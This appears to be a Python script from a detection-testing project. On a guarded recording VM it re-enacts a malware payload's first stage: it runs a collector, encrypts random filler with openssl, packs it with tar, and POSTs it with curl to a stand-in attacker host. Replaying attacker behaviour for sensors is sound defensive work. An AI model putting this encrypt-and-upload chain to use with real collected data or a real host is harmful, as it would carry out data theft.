# The payload's first stage, re-implemented from the public write-ups
# (../../../README.md) so that a sensor on the machine sees what it saw of
# the real one: the collector written to a temporary file and run with the
# same Python, then openssl, tar and curl, in that order, started by this
# process. What a sensor cannot see is not done: what the collector reads is
# dropped, and what is encrypted, packed and sent is random bytes of about
# the size of a sweep.
#
# It runs only on a recording VM, and stops at once anywhere else.
import ipaddress
import os
import shutil
import socket
import subprocess
import sys
import tempfile

HOST = "models.acme-tokens.example"
FILLER = 256 * 1024
PRIVATE = [ipaddress.ip_network(n) for n in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]


# A recording VM says it is one (vm/provision.sh writes the file), and its
# models.acme-tokens.example is the stand-in on the host, a private address.
# Both, or nothing below runs.
def guard():
    if not os.path.exists("/etc/tangent-eval-vm"):
        sys.exit(0)
    try:
        address = ipaddress.ip_address(socket.gethostbyname(HOST))
    except (OSError, ValueError):
        sys.exit(0)
    if not any(address in net for net in PRIVATE):
        sys.exit(0)


guard()
here = os.path.dirname(os.path.abspath(__file__))
tmp = tempfile.mkdtemp()
run = lambda *argv: subprocess.run(argv, cwd=tmp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# 1. The collector, written out and run as a script by this Python. The real
#    one's output was caught in a file; this one has none, and the file is
#    filler.
collector = os.path.join(tmp, "collect.py")
shutil.copyfile(os.path.join(here, "_sweep.py"), collector)
run(sys.executable, collector)
with open(os.path.join(tmp, "collected"), "wb") as fh:
    fh.write(os.urandom(FILLER))

# 2. A session key, the file encrypted with it, the key encrypted to the
#    sender's public key (its private half was thrown away when the case was
#    written), and the two packed.
shutil.copyfile(os.path.join(here, "upload.pem"), os.path.join(tmp, "pub.pem"))
run("openssl", "rand", "-out", "key.bin", "32")
run("openssl", "enc", "-aes-256-cbc", "-in", "collected", "-out", "data.enc", "-pass", "file:key.bin", "-pbkdf2")
run("openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", "pub.pem", "-in", "key.bin", "-out", "key.enc",
    "-pkeyopt", "rsa_padding_mode:oaep")
run("tar", "-czf", "bundle.tar.gz", "-C", tmp, "data.enc", "key.enc")

# 3. The upload: one POST of the archive to the attacker's host, which on a
#    recording VM is macos/standin/registry.py on the host and keeps none of it.
run("curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST", f"https://{HOST}/",
    "-H", "Content-Type: application/octet-stream", "-H", "X-Filename: bundle.tar.gz",
    "--data-binary", "@bundle.tar.gz")
shutil.rmtree(tmp, ignore_errors=True)
